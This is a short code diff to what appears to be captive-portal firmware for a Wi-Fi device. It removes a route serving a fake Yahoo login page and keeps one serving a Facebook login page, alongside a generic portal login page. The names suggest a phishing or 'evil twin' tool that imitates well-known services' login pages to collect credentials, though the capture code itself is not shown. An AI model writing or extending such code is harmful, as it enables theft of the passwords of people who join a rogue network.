@@ -16,7 +16,6 @@
 #include "config.h"
 #include "site1.h"
 #include "site2.h"
-#include "site3.h"
 #include "sitecaptiveportal.h"
 #include "portal_login.h"
 
@@ -104,11 +103,6 @@ void setup() {
   //SITE2 login page
   webServer.on(SITE2_redirect,[]() {
     webServer.send_P(200, "text/html", FACEBOOK_HTML);
-  });
-
-  //SITE3 login page
-  webServer.on(SITE3_redirect,[]() {
-    webServer.send_P(200, "text/html", YAHOO_HTML);
   });
 
   //Portal login page
